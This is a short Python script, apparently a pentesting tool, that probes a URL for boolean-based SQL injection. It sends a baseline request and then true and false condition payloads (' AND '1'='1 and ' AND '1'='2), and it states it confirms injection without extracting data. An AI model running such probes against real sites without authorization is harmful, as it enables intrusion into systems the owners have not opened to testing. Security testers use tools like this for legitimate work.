#!/usr/bin/env python3
"""Boolean/differential probe — safe injection confirmation without data extraction.

Sends a baseline, a TRUE-condition, and a FALSE-condition request and reports whether the
responses differ. A difference between TRUE and FALSE (but TRUE ~= baseline) indicates
injection — WITHOUT dumping anything. Read-only GET; confirms, never exfiltrates.

Usage: diff_probe.py "<url-with-FUZZ>"   (FUZZ marks the injection point)
"""
import sys
import urllib.request
import urllib.parse


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "recon-diff"})
    try:
        r = urllib.request.urlopen(req, timeout=12)
        body = r.read()
        return r.status, len(body)
    except urllib.error.HTTPError as e:
        return e.code, len(e.read() or b"")
    except Exception as e:
        return None, str(e)


def main():
    tmpl = sys.argv[1]
    if "FUZZ" not in tmpl:
        print("[!] put FUZZ where the payload goes")
        return
    baseline = tmpl.replace("FUZZ", "")
    true_p = tmpl.replace("FUZZ", urllib.parse.quote("' AND '1'='1"))
    false_p = tmpl.replace("FUZZ", urllib.parse.quote("' AND '1'='2"))
    for label, u in (("baseline", baseline), ("true  ", true_p), ("false ", false_p)):
        st, ln = fetch(u)
        print(f"{label}: status={st} len={ln}")
    print("\nInterpret: if TRUE matches baseline and FALSE differs (status/length),")
    print("that's a boolean-injection signal. Confirm the class, then STOP — do not extract.")


if __name__ == "__main__":
    main()
